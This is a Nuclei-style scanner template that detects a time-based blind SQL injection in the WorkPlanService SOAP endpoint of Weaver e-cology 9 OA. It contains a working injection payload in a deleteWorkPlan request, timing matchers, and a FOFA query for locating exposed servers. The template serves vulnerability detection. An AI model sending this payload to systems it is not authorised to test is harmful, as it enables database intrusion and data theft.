id: weaver-ecology-v9-workplanservice-sqli

info:
  name: 泛微 OA E-Cology 9 WorkPlanService - sqli
  author: leadlife
  severity: high
  description: 泛微 e-cology9 WorkPlanService 前台存在 SQL 注入漏洞，攻击者能够利用该漏洞执行任意 SQL 语句，获取数据库敏感信息或控制数据库服务器。
  reference:
    https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEe-cology9%E6%8E%A5%E5%8F%A3WorkPlanService%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(XVE-2024-18112).md
  metadata:
    verified: true
    fofa-query: app="泛微-OA（e-cology）"
  tags: weaver, sqli, rce, ecology , oa, time

http:
  - raw:
      - |
        @timeout: 15s
        POST /services/WorkPlanService HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml;charset=UTF-8
        
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
            <soapenv:Header />
            <soapenv:Body>
                <web:deleteWorkPlan>
                    <!--type: string-->
                    <web:in0>
                        (SELECT 8544 FROM (SELECT (SLEEP(5-(IF(27=27,0,5)))))NZeo)
                    </web:in0>
                    <!--type: int-->
                    <web:in1>
                        22
                    </web:in1>
                </web:deleteWorkPlan>
            </soapenv:Body>
        </soapenv:Envelope>

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration >= 4 && duration < 9
        condition: and
